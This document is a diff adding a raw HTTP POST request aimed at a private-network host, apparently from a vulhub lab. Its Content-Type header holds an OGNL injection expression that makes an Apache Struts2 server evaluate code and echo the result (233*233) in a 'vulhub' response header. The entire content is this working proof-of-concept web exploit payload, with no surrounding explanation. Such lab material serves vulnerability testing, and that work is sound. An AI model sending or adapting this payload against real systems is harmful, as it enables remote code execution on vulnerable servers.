@@ -1,0 +1,6 @@
+POST /index.action HTTP/1.1
+Host: 10.10.3.128
+Connection: close
+Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
+Content-Length: 0
+
